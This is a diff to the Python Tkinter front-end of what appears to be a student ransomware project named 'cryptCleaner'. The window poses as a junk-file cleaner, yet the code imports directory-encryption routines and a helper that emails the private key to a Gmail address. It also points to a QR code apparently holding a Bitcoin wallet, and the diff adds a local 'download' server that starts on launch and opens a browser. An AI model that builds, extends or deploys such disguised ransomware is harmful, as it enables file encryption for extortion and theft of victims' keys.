@@ -1,15 +1,39 @@
+import subprocess
+import time
 import tkinter as tk
+import webbrowser
 from tkinter import Toplevel, simpledialog, messagebox
 from PIL import Image, ImageTk
 from src.encryptor import encrypt_directory, decrypt_directory
-from src.email_utils import send_private_key_email  # Cambiado a send_private_key_email
+from src.email_utils import send_private_key_email
 from pathlib import Path
 
-# Ruta al código QR con la dirección de la cartera BTC
+# Ruta del servidor y QR
 QR_CODE_PATH = "C:/Users/kekol/Desktop/TCC/cryptCleaner/qr_code.png"
 DIRECTORY_TO_ENCRYPT = Path("C:/Users/kekol/Desktop/TCC/cryptCleaner/data")
+SERVER_SCRIPT = "server.py"
 
 recipient_email = "tccsmtp12@gmail.com"  # Cambia por el email de destino
+
+# Iniciar el servidor
+def start_server():
+    try:
+        server_process = subprocess.Popen(['python', SERVER_SCRIPT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        time.sleep(3)  # Dar tiempo al servidor para iniciarse
+        print("Servidor de descarga iniciado.")
+
+        # Abrir el navegador automáticamente en la URL de descarga
+        webbrowser.open("http://127.0.0.1:8443/download")
+        return server_process
+    except Exception as e:
+        print(f"Error al iniciar el servidor: {e}")
+        return None
+
+# Detener el servidor
+def stop_server(server_process):
+    if server_process:
+        server_process.terminate()
+        print("Servidor de descarga detenido.")
 
 # Crear la ventana principal
 root = tk.Tk()
@@ -120,5 +144,10 @@ circle_canvas.bind("<Button-1>", lambda e: limpiar_archivos())
 label_text = tk.Label(content_frame, text="Limpiar archivos basura", font=("Arial", 16), bg="#ffffff", fg="#000000")
 label_text.place(relx=0.5, rely=0.5, anchor="n")
 
-# Ejecutar la interfaz gráfica
-root.mainloop()
+# Ejecutar el servidor y la interfaz gráfica
+if __name__ == "__main__":
+    server_process = start_server()
+    try:
+        root.mainloop()
+    finally:
+        stop_server(server_process)
